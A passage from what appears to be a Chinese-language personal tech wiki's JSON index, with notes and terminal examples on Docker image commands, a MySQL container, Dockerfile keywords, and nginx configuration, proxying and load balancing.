BUILD_DATE PROJECT_URL… 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE VERSION 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE 0B yanque@yanquedembp test % save docker save : 将指定镜像保存成 tar 归档文件 注解 docker export 也可以导出, 但是其针对的是容器, save针对的是镜像 语法 docker save [OPTIONS] IMAGE [IMAGE...] OPTIONS说明： -o :输出到的文件 示例 将镜像 yanquer/kali 生成归档文件. yanque@yanquedembp test % docker save -o mykali_image.tar yanquer/kali yanque@yanquedembp test % ls 1 .txt c++ dd mykali-20221228.tar mykali_image.tar yanque@yanquedembp test % ls -lh mykali_image.tar -rw-------@ 1 yanque staff 232M 12 28 16 :47 mykali_image.tar yanque@yanquedembp test % load docker load : 导入使用 docker save 命令导出的镜像 注解 docker export 导出归档的加载见 docker import . 语法 docker load [OPTIONS] OPTIONS说明： --input , -i : 指定导入的文件，代替 STDIN。 --quiet , -q : 精简输出信息。 示例 -i 的效果与 < 一样(懂shell重定向的都知道). 导入 yanquer/kali:config_apt_list2 yanque@yanquedembp test % docker load < mykali_image.tar Loaded image: yanquer/kali:config_apt_list2 yanque@yanquedembp test % yanque@yanquedembp test % docker load --input mykali_image.tar Loaded image: yanquer/kali:config_apt_list2 yanque@yanquedembp test % import docker import : 从归档文件中创建镜像 注解 除了导出 docker save 还可用于导入 docker export 导出的容器归档文件. 语法 docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] OPTIONS说明： -c :应用docker 指令创建镜像； -m :提交时的说明文字； 示例 从 mykali-20221228.tar 归档文件创建 yanquer/mykali 镜像 yanque@yanquedembp test % docker import mykali-20221228.tar yanquer/mykali sha256:514ae6d5ab88157b978b729520e30c687a5b1b2e3ff2200de88c827bf5ec5ec8 yanque@yanquedembp test % yanque@yanquedembp test % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/mykali latest 514ae6d5ab88 6 seconds ago 235MB","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html"},{"title":"镜像仓库","text":"login/logout docker login : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub docker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub 语法 docker login [OPTIONS] [SERVER] docker logout [OPTIONS] [SERVER] OPTIONS说明： -u :登陆的用户名 -p :登陆的密码 示例 登陆到Docker Hub docker login -u 用户名 -p 密码 登出Docker Hub docker logout pull docker pull : 从镜像仓库中拉取或者更新指定镜像 语法 docker pull [OPTIONS] NAME[:TAG|@DIGEST] OPTIONS说明 -a 拉取所有 tagged 镜像 --disable-content-trust 忽略镜像的校验,默认开启 --platform= <plartform> 获取指定平台镜像, 默认拉自己平台的, 如 docker pull --platform=arm64 nginx:latest 示例 从Docker Hub下载java最新版镜像: docker pull java 从Docker Hub下载REPOSITORY为java的所有镜像: docker pull -a java 拉取arm64的nginx: docker pull --platform=arm64 nginx push 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库. 语法 docker push [OPTIONS] NAME[:TAG] OPTIONS说明： --disable-content-trust :忽略镜像的校验,默认开启 示例 上传本地镜像 yanquer/kali:config_apt_list2 到镜像仓库中。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker push yanquer/kali:config_apt_list2 The push refers to repository [ docker.io/yanquer/kali ] b94b4b255fde: Pushed cca6e5a3dfb7: Pushed 385ea7e36a43: Pushed config_apt_list2: digest: sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff size: 948 ( dev_venv ) yanque@yanquedeMacBook-Pro project % 注解 docker hub 可 类比与 github. 注意需要先使用 docker login 登陆, 且目标地址已有登陆仓库(没有需要先在仓库创建). 如要验证是否已登陆, 可使用 cat ~/.docker/config.json 查看内容是否有 auths . search docker search : 从Docker Hub查找镜像 语法 docker search [OPTIONS] TERM OPTIONS说明： --automated :只列出 automated build类型的镜像； --no-trunc :显示完整的镜像描述； -f <过滤条件>:列出收藏数不小于指定值的镜像。 示例 从 Docker Hub 查找所有镜像名包含 java ，并且收藏数大于 10 的镜像 yanque@yanquedembp mytest % docker search -f stars = 10 java NAME DESCRIPTION STARS OFFICIAL AUTOMATED node Node.js is a JavaScript-based platform for s… 12222 [ OK ] tomcat Apache Tomcat is an open source implementati… 3458 [ OK ] java DEPRECATED ; use \"openjdk\" ( or other JDK impl… 1976 [ OK ] ghost Ghost is a free and open source blogging pla… 1582 [ OK ] couchdb CouchDB is a database that uses JSON for doc… 500 [ OK ] jetty Jetty provides a Web server and javax.servle… 387 [ OK ] amazoncorretto Corretto is a no-cost, production-ready dist… 267 [ OK ] groovy Apache Groovy is a multi-faceted language fo… 137 [ OK ] circleci/node Node.js is a JavaScript-based platform for s… 130 ibmjava Official IBM® SDK, Java™ Technology Edition … 107 [ OK ] tomee Apache TomEE is an all-Apache Java EE certif… 100 [ OK ] ibmcom/ibmjava IBM® SDK, Java™ Technology Edition Docker Im… 21 bitnami/java Bitnami Java Docker Image 13 [ OK ] 参数说明 NAME: 镜像仓库源的名称 DESCRIPTION (描述) : 镜像的描述 OFFICIAL: 是否 docker 官方发布 stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。 AUTOMATED: 自动构建。","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html"},{"title":"info|version","text":"info 显示 Docker 系统信息，包括镜像和容器数 语法 docker info [OPTIONS] 示例 查看docker系统信息 yanque@yanquedembp ~ % docker info Client: Context: default Debug Mode: false Plugins: buildx: Docker Buildx ( Docker Inc., v0.9.1 ) compose: Docker Compose ( Docker Inc., v2.13.0 ) dev: Docker Dev Environments ( Docker Inc., v0.0.5 ) extension: Manages Docker extensions ( Docker Inc., v0.2.16 ) sbom: View the packaged-based Software Bill Of Materials ( SBOM ) for an image ( Anchore Inc., 0 .6.0 ) scan: Docker Scan ( Docker Inc., v0.22.0 ) Server: Containers: 1 Running: 0 Paused: 0 Stopped: 1 Images: 3 Server Version: 20 .10.21 Storage Driver: overlay2 Backing Filesystem: extfs Supports d_type: true Native Overlay Diff: true userxattr: false Logging Driver: json-file Cgroup Driver: cgroupfs Cgroup Version: 2 Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: runc io.containerd.runc.v2 io.containerd.runtime.v1.linux Default Runtime: runc Init Binary: docker-init containerd version: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661 runc version: v1.1.4-0-g5fd4c4d init version: de40ad0 Security Options: seccomp Profile: default cgroupns Kernel Version: 5 .15.49-linuxkit Operating System: Docker Desktop OSType: linux Architecture: x86_64 CPUs: 4 Total Memory: 7 .675GiB Name: docker-desktop ID: OY2O:RZL6:WSMC:6CSU:F2F4:ETDE:JYMM:UYOJ:O3DU:VMV5:NPFN:PA3X Docker Root Dir: /var/lib/docker Debug Mode: false HTTP Proxy: http.docker.internal:3128 HTTPS Proxy: http.docker.internal:3128 No Proxy: hubproxy.docker.internal Registry: https://index.docker.io/v1/ Labels: Experimental: false Insecure Registries: hubproxy.docker.internal:5000 127 .0.0.0/8 Registry Mirrors: https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com/ https://ypzju6vq.mirror.aliyuncs.com/ https://registry.docker-cn.com/ http://hub-mirror.c.163.com/ https://docker.mirrors.ustc.edu.cn/ Live Restore Enabled: false yanque@yanquedembp ~ % version 显示 Docker 版本信息。 语法 docker version [OPTIONS] OPTIONS说明： -f :指定返回值的模板文件。 示例 显示 Docker 版本信息 yanque@yanquedembp ~ % docker version Client: Cloud integration: v1.0.29 Version: 20 .10.21 API version: 1 .41 Go version: go1.18.7 Git commit: baeda1f Built: Tue Oct 25 18 :01:18 2022 OS/Arch: darwin/amd64 Context: default Experimental: true Server: Docker Desktop 4 .15.0 ( 93002 ) Engine: Version: 20 .10.21 API version: 1 .41 ( minimum version 1 .12 ) Go version: go1.18.7 Git commit: 3056208 Built: Tue Oct 25 18 :00:19 2022 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1 .6.10 GitCommit: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661 runc: Version: 1 .1.4 GitCommit: v1.1.4-0-g5fd4c4d docker-init: Version: 0 .19.0 GitCommit: de40ad0 yanque@yanquedembp ~ %","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-info_version.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-info_version.html"},{"title":"mysql","text":"hub地址:: docker-mysql 一些环境变量: MYSQL_ROOT_PASSWORD MYSQL_DATABASE MYSQL_USER, MYSQL_PASSWORD MYSQL_ALLOW_EMPTY_PASSWORD MYSQL_RANDOM_ROOT_PASSWORD MYSQL_ONETIME_PASSWORD MYSQL_INITDB_SKIP_TZINFO 运行: docker run --name mymysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -d mysql:tag","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-mysql.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-mysql.html"},{"title":"dockerfile编写","text":"定制docker镜像的方式有两种 手动修改容器内容，导出新的镜像; 相关指令: docker commit 将容器提交为镜像 基于Dockerfile自行编写指令，基于指令流程创建镜像 注解 前置知识: 镜像是分层的; 容器以镜像为基础层, 本身为运行时存储层 关键字 每一句关键字指令都会生成一个镜像层 FROM 必须 , 基于的基础镜像, 比如 debian, 没有基础镜像, 没法运行上面的层 RUN 执行什么指令, 比如: apt install xxx VOLUME 设置卷，挂载主机目录; 如建立的数据目录, 比如: # 将 /var/lib/xxx 设置为挂载卷(mount) VOLUME /var/lib/xxx # 将容器内的 /var/lib/xxx 文件夹，在容器运行时， # 该目录自动挂载为匿名卷，任何向该目录中写入数据的操作， # 都不会被容器记录，保证的容器存储层无状态理念 如果有多个: VOLUME [\"/var/lib/xxx\", \"/var/lib/xxx2\", \"/var/lib/xxx3\", ...] 容器在运行时，应该保证在存储层不写入任何数据，运行在容器内产生的数据， 推荐是 挂载，写入到宿主机上，进行维护。 如果run的时候没有-v手动指定挂载, 指定的内容会自动挂载到宿主机, 可以使用: docker inspect $container_name 检查挂载的位置 MAINTAINER 指定维护者信息，可以没有 ADD COPY宿主机的文件到容器内, 会自动解压 还支持 URL 下载链接, 权限默认600, 但是这时不会解压(如果是压缩包) 官方更推荐COPY, 因为ADD包含了更多复杂的功能，且ADD会使构建缓存失效，导致镜像构建缓慢 WORKDIR 设置当前工作目录 USER 设置当前用户 EXPOSE 指定容器运行时对外提供的端口服务， 帮助使用该镜像的人，快速理解该容器的一个端口业务 相关指令: docker port 容器 # 查看已经映射的端口 docker run -p 宿主机端口：容器端口 docker run -P # 作用是随机宿主机端口：容器内端口 CMD 指定容器启动后的要干的事情, 语法: CMD [\"参数1\", \"参数2\"] 与直接在docker run 最后写command效果一致. 即该镜像在运行容器实例的时候，执行的具体参数是什么, 如: docker run -it debian bash # 注意这里的优先级高于CMD的, 也就是如果指定了会覆盖CMD的 定义 # 就相当于dockerfile的 CMD [\"bash\"] 貌似很多默认行为就是: CMD [\"/bin/bash\"] 如果是多个要分开: CMD [\"cat\", \"/etc/debian_version\"] 如果指定了 ENTRYPOINT, CMD指定具体的参数就是传给 ENTRYPOINT ENV 设置环境变量; 比如: ENV a 1 COPY COPY宿主机的文件到容器内, 不会自动解压 ENTRYPOINT 容器启动后执行的命令. 作用和CMD一样 当指定了 ENTRYPOINT, CMD指定具体的参数就是传给 ENTRYPOINT ARG 设置环境变量, 这点与ENV一致; 区别在于: ENV 无论是在镜像构建时，还是容器运行，该变量都可以使用; ARG只是用于构建镜像需要设置的变量，容器运行时就消失了 创建 注解 创建的文件名必须时 Dockerfile / dockerfile 写好后构建出镜像: docker build . 经典问题: CMD systemctl start nginx 这样的写法是错误的，容器会立即退出 因为systemct1 start nginx是希望以守护进程形式启动nginx，且CMD命令会转化为 CMD [\"sh\"，\"-C\"， \"systemctl start nginx\"] 这样的命令主进程是sh解释器，执行完毕后立即结束了，因此容器也就退出了。 因此正确的做法应该是CMD [\"nginx\"，\"-g\"，\"daemon off；\"]","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-dockerfile-writing.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-dockerfile-writing.html"},{"title":"与其他产品对比","text":"什么情况下用nginx? 大流量, 性能 与Apache对比 什么情况下使用 Apache httpd ? 高并发 降低请求的切换成本 降低单请求的内存占用 对高频操作以空间换时间 Web容器 同步方式 阻塞方式","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Compared-with-other-products.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Compared-with-other-products.html"},{"title":"nginx配置管理","text":"参考: Nginx web server配置 管理 Nginx 进程 注解 关于 Master 和 Worker 进程, 见 NginxMasterAndWorker 有两种方式让修改后的配置文件生效： 停止 并 重启 Nginx 给`master`进程发送信号 信号可以通过以下方式发送(nginx是可执行文件): nginx -s signal 其中 signal 常用选项如下 quit - 优雅的关闭，即处理完当前请求再关闭 reload - 重新载入配置文件 reopen - 重新打开日志文件 stop - 立即关闭 也可以通过Linux的`kill`命令直接发送信号给`master`进程。Nginx的进程ID通常保存在`/usr/local/nginx/logs`或`/var/run`目录下的`nginx.pid`文件中。 使用变量 通过在配置文件中使用变量，可以让Nginx以不同的方式处理请求。 变量的值在运行时计算获得，并可作为参数传递给指令。 变量必须以`$`开头。变量基于Nginx的状态定义信息，如正被处理请求的属性。 Nginx包含许多预设的变量，如`core HTTP`变量集，也可以使用`set`、 map`和`geo`指令来自定义变量。 大多数变量都在运行时计算值，这些值一般都包含某个请求的相关信息。 如`$remote_addr`包含了IP地址，而`uri`则包含了当前访问的`URI 。 内置全局变量 变量: $args ：这个变量等于请求行中的参数，同$query_string $content_length ： 请求头中的Content-length字段。 $content_type ： 请求头中的Content-Type字段。 $document_root ： 当前请求在root指令中指定的值。 $host ： 请求主机头字段，否则为服务器名称。 $http_user_agent ： 客户端agent信息 $http_cookie ： 客户端cookie信息 $limit_rate ： 这个变量可以限制连接速率。 $request_method ： 客户端请求的动作，通常为GET或POST。 $remote_addr ： 客户端的IP地址。 $remote_port ： 客户端的端口。 $remote_user ： 已经经过Auth Basic Module验证的用户名。 $request_filename ： 当前请求的文件路径，由root或alias指令与URI请求生成。 $scheme ： HTTP方法（如http，https）。 $server_protocol ： 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。 $server_addr ： 服务器地址，在完成一次系统调用后可以确定这个值。 $server_name ： 服务器名称。 $server_port ： 请求到达服务器的端口号。 $request_uri ： 包含请求参数的原始URI，不包含主机名，如：\"/foo/bar.php?arg=baz\"。 $uri ： 不带请求参数的当前URI，$uri不包含主机名，如\"/foo/bar.html\"。 $document_uri ： 与$uri相同。 一些内置关键字 server_name 当配置了多个server时，且某个server有配置server_name时，会优先找server_name，就会访问不到我想要的那个server 另外，apt安装的nginx默认在 /etc/nginx/sites-available/default 下有一个默认的server配置，要避免于这个冲突或者直接删除 root 使用范围：可以在 server、http、location 表示路径拼接（一般配置静态资源），比如: location /img { root /var/img/ } 实际经过 root 之后的路径为: /img/var/img alias 使用范围：只能在 location 表示新路径（从根路径开始），比如: location /img { alias /var/img/ } 实际经过 alias 之后的路径为: /var/img 注解 实际使用注意分清 root 与 alias alias使用范围：只能在 location root使用范围：可以在 server、http、location 例子: # 访问 localhost/ui/some 时候 实际访问的是 /var/www/ui/build/static/some # 只认自己定义的别名，注意不加 / 会触发重定向到正确的路径 location /ui/ { alias /var/www/ui/build/static/ ; } # 访问 localhost/ui/some 时候 实际访问的是 /var/www/ui/build/static/ui/some # 会把 location前缀加进去 location /ui/ { root /var/www/ui/build/static/ ; } return return 状态码 字符串 第二个字符串可选，默认访问会以文件的形式下载 rewrite 实现对url的重写、重定向 格式: rewrite $正则 $替换内容 [flag标记] 例子: # 将url中的api去除 location /ui { rewrite \"&#94;/api/(.*)$\" /$1 break ; } break 在重写url后，不再重新匹配路径 last 在重写路径后，将得到的路径重新进行一次路径路径匹配 try_files 按照给定的文件列表匹配文件，访问找到的第一个文件， 若文件都没有匹配到，重新请求最后一个参数给的 url 格式: try_files file1 file2 ...(可以有多个file) url ~ 表示开启正则匹配 proxy_pass 反向代理 表示动态请求，需要进行请求转发（如转发到tomcat）（用法与root基本一致） upstream 负载均衡配置 反向代理中，我们通过proxy_pass来指定Tomcat的地址， 很显然我们只能指定一台Tomcat地址，那么我们如果想指定多台来达到负载均衡呢？ 第一, 通过 upstream 来定义一组Tomcat， 并指定负载策略（IPHASH、加权论调、最少连接）, 健康检查策略（Nginx可以监控这一组Tomcat的状态）等。 第二，将proxy_pass替换成upstream指定的值即可。 负载均衡可能带来的问题？ 负载均衡所带来的明显的问题是，一个请求，可以到A server，也可以到B server， 这完全不受我们的控制，当然这也不是什么问题， 只是我们得注意的是： 用户状态的保存问题，如Session会话信息，不能在保存到服务器上 斜杠的作用 被代理的路径加不加斜杠的情况, 尝试访问 xx.xx.xx.xx/ui/img/img1.png # 实际访问的是 http://127.0.0.1:5555/img/img1.png location /ui/ { proxy_pass http://127.0.0.1:5555/ ; } # 实际访问的是 http://127.0.0.1:5555/ui/img/img1.png location /ui/ { proxy_pass http://127.0.0.1:5555 ; } 如何配置 配置详解 配置路径一般在 /etc/nginx/nginx.conf , 如果是lnmp环境安装, 配置文件可能是在 /usr/local/nginx/conf/nginx.conf 其他情况: 默认的配置文件位置: /usr/local/nginx/conf, /etc/nginx, or /usr/local/etc/nginx. 打开主配置文件: vim /usr/local/nginx/conf/nginx.conf 内容与解释: user # 设置nginx服务的系统使用用户 worker_processes # 工作进程数 一般情况与CPU核数保持一致 error_log # nginx的错误日志 pid # nginx启动时的pid events { worker_connections # 每个进程允许最大连接数 use # nginx使用的内核模型 } 我们使用 nginx 的 http 服务，在配置文件 nginx.conf 中的 http 区域内， 配置无数个 server ，每一个 server 对应这一个虚拟主机或者域名: http { ... ... #后面再详细介绍 http 配置项目 server { listen 80 #监听端口; server_name localhost #地址 location / { #访问首页路径 root /xxx/xxx/index.html #默认目录 index index.html index.htm #默认文件 } error_page 500 504 /50x.html #当出现以上状态码时从新定义到50x.html location = /50x.html { #当访问50x.html时 root /xxx/xxx/html #50x.html 页面所在位置 } } server { ... ... } } 一个 server 可以出现多个 location ，我们对不同的访问路径进行不同情况的配置。 我们再来看看 http 的配置与含义: http { sendfile on # 高效传输文件的模式 一定要开启 keepalive_timeout 65 # 客户端服务端请求超时时间 log_format main XXX # 定义日志格式 代号为main access_log /usr/local/access.log main # 日志保存地址 格式代码 main } 配置内容全部一览: # 配置http http { server { # 服务器配置，可以有多个server listen 127.0.0.1:8080 # 监听的端口 # 如果不填写端口，则采用标准端口。 # 如果不填写ip地址，则监听所有地址。 # 如果缺少整条listen指令，则标准端口是80/tcp， # 默认端口是8000/tcp，由超级用户的权限决定。 # 多个server配置了相同的ip地址和端口，Nginx会匹配server_name指令与请求头部的host字段。 # server_name指令的参数可以是精确的文本、通配符或正则表达式。 server_name example.org www.example.org; # 如果有多个server_name匹配host字段，Nginx根据以下规则选择第一个相匹配的server处理请求： # 1、精确匹配 # 2、以*开始的最长通配符，如 *.example.org # 3、以*结尾的最长通配符，如 mail.* # 4、第一个匹配的正则表达式（根据在配置文件中出现的先后顺序） # 如果找不到任何与host字段相匹配的server_name，Nginx会根据请求端口将其发送给默认的server。 # 默认server就是配置文件中第一个出现的server， # 也可以通过default_server指定某个server为默认server， # 如listen 0.0.0.0:8080 default_server # 根据URL将请求发送给不同的代理/处理不同的文件请求。由server指令中的location指令配置规则。 # 匹配以/some/path/开始的请求URI location /some/path/ { ... } # ~ 用于匹配区分大小写的正则表达式， # ~* 用于匹配不区分大小写的正则表达式。 # 匹配任意包含.html或.htm的URI。 location ~ \\.html? { ... } # Nginx先匹配前缀字符串，然后再匹配正则表达式。正则表达式拥有较高优先级， # 除非使用&#94;~修饰符。在所有前缀字符串中，Nginx会挑选最精确的那个，也就是最长最匹配的那个。 # 详细匹配过程如下： # 1、匹配所有前缀字符串； # 2、如果有一个 = 定义的精确匹配前缀字符串，停止继续匹配； # 3、如果 &#94;~ 在最长匹配的前缀字符串之前，将忽略正则表达式； # 4、存储最长的匹配前缀字符串； # 5、匹配正则表达式； # 6、找到第一个相匹配的正则表达，停止匹配过程，并执行该location指令； # 7、如果没有正则表达式匹配，则使用第4步存储的最长前缀字符串； # = 修饰符的典型应用是匹配 /请求。 # 针对频繁访问/的情况，将location参数设置为= /可以加速处理过程， # 因为整个匹配过程在第一条之后就结束了。 location = / { ... } # location指令内可以配置如何处理请求：处理静态文档或将请求转发给代理服务器。 # 在下面的例子中，匹配第一个location的请求可以访问/data目录的文件， # 匹配第二个location的请求将被转发到www.example.com服务器。 location /images/ { # root指令指定了静态文件的文件系统路径，将与请求URI一起构成静态文件的完全路径 root /data; } location / { # proxy_pass指令将请求转发到代理服务器，并将代理服务器的响应返回给客户端。 proxy_pass http://www.example.com; } # sub_filter指令支持重写或修改HTTP请求的响应内容，如替换某个字符串。该指令支持变量和链式替换。 # 将指向服务器的链接改为指向代理服务器的链接： location / { sub_filter /blog/ /blog-staging/; sub_filter_once off; } # 将http请求改为https请求，并将请求头部的本地主机地址改为主机名。 # sub_filter_once指令用于告诉Nginx是否连续执行location中的sub_filter指令。 # 注意：被sub_filter指令修改后的内容将不会再被其他sub_filter指令修改。 location / { sub_filter 'href=\"http://127.0.0.1:8080/' 'href=\"https://$host/'; sub_filter 'img src=\"http://127.0.0.1:8080/' 'img src=\"https://$host/'; sub_filter_once on; } # error_page指令用于返回一个自定义错误页面和一个错误代码、 # 修改响应中的错误代码或重定向到不同的URI。 # 当Nginx未能找到请求的页面时，不会返回404，而会返回303和一个重定向到新页面指令。 # 这通常用于处理客户端访问旧地址的情况。 location /old/path.html { error_page 404 =301 http:/example.com/new/path.html; } # 有些网站在处理错误或重定向时，会要求立即返回一个状态码。最简单的方式就是使用return指令 location /wrong/url { return 404; } # return指令的第一个参数是一个状态码。 # 第二个是可选参数，可以是重定向的URL（当状态码是301、302、303和307时）， # 也可以是返回的文本信息。 location /permanently/moved/url { return 301 http://www.example.com/moved/here; } # 处理请求过程中，可以通过rewrite指令重复修改请求的URI。 # rewrite指令包含2个必填参数和1个可选参数。 # 第一个参数是请求URI必须匹配的正则表达式。第二个参数是要替换的目标URI。 # 第三个为可选参数，可以是一个是否继续执行后续rewrite指令的标记， # 也可以发送一个重定向指令(状态码是301或302)。 location /users/ { rewrite &#94;/users/(.*)$ /show?user=$1 break; } } # location和server中都可以包含多个rewrite指令。 # Nginx从上到下依次磁性rewrite指令，每次进入server指令块时，rewrite指令都会被执行一次。 # Nginx执行完一系列rewrite指令后，根据最新的URI来选择location指令。 # 如果location中也包含rewrite指令，它们也将被依次执行，执行完毕后将重新选择location。 server { ... rewrite &#94;(/download/.*)/media/(.*)\\..*$ $1/mp3/$2.mp3 last; rewrite &#94;(/download/.*)/audio/(.*)\\..*$ $1/mp3/$2.ra last; return 403; ... } # 这个例子用于区分两套不同的URI。 # 类似于/download/some/media/file的URI将被改写为/download/some/mp3/file.mp3。 # 由于最后的标识last，Nginx将忽略随后的两条指令，然后以新的URI继续处理请求。 # 同样地，类似于/download/some/audio/file的URI将被改写为/download/some/mp3/file.ra。 # 如果请求URI都不匹配上述两条rewrite指令，Nginx将返回403错误代码。 # rewrite指令可以包含以下两种参数，用于中断处理过程： # last - 停止执行当前server或location中的rewrite指令，并以新的URI查找新的location； # break - 停止执行当前上下文环境内的rewrite指令，并不以新的URI查找新的location； # 以下例子中，当访问一个不存在的文件时，Nginx会将请求重定向到http://backend。 # 由于error_page指令未指定重定向代码，该代码将由重定向后的http://backend返回。 # 当请求文件未找到时，error_page指令将发起一个内部重定向。 # $url变量持有当前请求的URI，并被传递给重定向。 # 假设请求的/images/some/file文件未找到，将被重定向到/fetch/images/some/file， # 同时搜索新的location。最终，请求将被第二个location处理，并被代理到http://backend。 # open_file_cache_errors指令可用于未找到请求文件时，禁止产生错误消息。 # 在下例中可以忽略，因为错误已被正确处理。 server { ... location /images/ { # Set the root directory to search for the file root /data/www; # Disable logging of errors related to file existence open_file_cache_errors off; # Make an internal redirect if the file is not found error_page 404 = /fetch$uri; } location /fetch/ { proxy_pass http://backend/; } } } 本地实际配置尝试 配置前端: location /static { alias /var/www/ui/build/static ; # 静态资源映射 } location /ui/ { alias /var/www/ui/build/ ; # 前端ui资源 try_files $uri $uri/ index.html } location / { rewrite / /ui/ ; # 所有没匹配到的请求都交给 /ui/处理 }","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Configuration.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Configuration.html"},{"title":"nginx概念详解","text":"Nginx联合创始人安德鲁·阿列克谢夫（Andrew Alexeev）曾说： Nginx是为对Apache性能不满意的人而构建的。随着Internet需求的变化，Web服务器的工作也在变化。 Nginx的构建比以往任何时候都更有效率，更可扩展，更安全，更强大。 本文提供了Nginx的基本概念及知识。以开发者必备的Nginx基础知识为主，罗列了一些Nginx教程，希望对大家有所帮助。 Nginx的产生 Nginx 同 Apache 一样都是一种 Web 服务器。 基于 REST 架构风格，以统一资源描述符（Uniform Resources Identifier）URI 或者统一资源定位符（Uniform Resources Locator）URL 作为沟通依据，通过 HTTP 协议提供各种网络服务。 然而，这些服务器在设计之初受到当时环境的局限， 例如当时的用户规模，网络带宽，产品特点等局限并且各自的定位和发展都不尽相同。 这也使得各个 Web 服务器有着各自鲜明的特点。 Apache 的发展时期很长，而且是毫无争议的世界第一大服务器。它有着很多优点：稳定、开源、跨平台等等。 它出现的时间太长了，它兴起的年代，互联网产业远远比不上现在。所以它被设计为一个重量级的。 它不支持高并发的服务器。在 Apache 上运行数以万计的并发访问，会导致服务器消耗大量内存。 操作系统对其进行进程或线程间的切换也消耗了大量的 CPU 资源，导致 HTTP 请求的平均响应速度降低。 这些都决定了 Apache 不可能成为高性能 Web 服务器，轻量级高并发服务器 Nginx 就应运而生了。 俄罗斯的工程师 Igor Sysoev，他在为 Rambler Media 工作期间，使用 C 语言开发了 Nginx。 Nginx 作为 Web 服务器一直为 Rambler Media 提供出色而又稳定的服务。然后呢，Igor Sysoev 将 Nginx 代码开源，并且赋予自由软件许可证。 由于以下这几点，所以，Nginx 火了 Nginx 使用基于事件驱动架构，使得其可以支持数以百万级别的 TCP 连接。 高度的模块化和自由软件许可证使得第三方模块层出不穷（这是个开源的时代啊）。 Nginx 是一个跨平台服务器，可以运行在 Linux、Windows、FreeBSD、Solaris、AIX、Mac OS 等操作系统上。 这些优秀的设计带来的极大的稳定性。 Nginx 基本概念 正向代理与反向代理 为了便于理解，首先先来了解一下一些基础知识，nginx是一个高性能的反向代理服务器那么什么是反向代理呢？ 代理是在服务器和客户端之间假设的一层服务器，代理将接收客户端的请求并将它转发给服务器，然后将服务端的响应转发给客户端。 不管是正向代理还是反向代理，实现的都是上面的功能。 如果对OSI 七层模型与 TCP/IP 四层模型不是很熟悉可以再回顾下 正向代理 正向代理（forward）意思是一个位于客户端和原始服务器 (origin server) 之间的服务器， 为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标 (原始服务器)， 然后代理向原始服务器转交请求并将获得的内容返回给客户端。 正向代理是为我们服务的，即为客户端服务的，客户端可以根据正向代理访问到它本身无法访问到的服务器资源。 正向代理对我们是透明的，对服务端是非透明的，即服务端并不知道自己收到的是来自代理的访问还是来自真实客户端的访问。 反向代理 反向代理（Reverse Proxy）方式是指以代理服务器来接受 internet 上的连接请求， 然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端， 此时代理服务器对外就表现为一个反向代理服务器。 反向代理是为服务端服务的，反向代理可以帮助服务器接收来自客户端的请求，帮助服务器做请求转发，负载均衡等。 反向代理对服务端是透明的，对我们是非透明的，即我们并不知道自己访问的是代理服务器，而服务器知道反向代理在为他服务。 负载均衡 如果请求数过大，单个服务器解决不了，我们增加服务器的数量，然后将请求分发到各个服务器上， 将原先请求集中到单个服务器的情况改为请求分发到多个服务器上，就是负载均衡。 Upstream 指定后端服务器地址列表，在 server 中拦截响应请求，并将请求转发到 Upstream 中配置的服务器列表: upstream balanceServer { server 10.1.22.33:12345; server 10.1.22.34:12345; server 10.1.22.35:12345; } server { server_name fe.server.com; listen 80; location /api { proxy_pass http://balanceServer; } } 上面的配置只是指定了 nginx 需要转发的服务端列表，并没有指定分配策略。 默认情况下采用的是轮询策略，将所有客户端请求轮询分配给服务端。 这种策略是可以正常工作的，但是如果其中某一台服务器压力太大，出现延迟，会影响所有分配在这台服务器下的用户。 Nginx支持的负载均衡调度算法 weight轮询(默认，常用) 接收到的请求按照权重分配到不同的后端服务器， 即使在使用过程中，某一台后端服务器宕机，Nginx会自动将该服务器剔除出队列， 请求受理情况不会受到任何影响。这种方式下， 可以给不同的后端服务器设置一个权重值(weight)，用于调整不同的服务器上请求的分配率； 权重数据越大，被分配到请求的几率越大； 该权重值，主要是针对实际工作环境中不同的后端服务器硬件配置进行调整的。 ip_hash（常用） 每个请求按照发起客户端的ip的hash结果进行匹配， 这样的算法下一个固定ip地址的客户端总会访问到同一个后端服务器， 这也在一定程度上解决了集群部署环境下session共享的问题。 fair 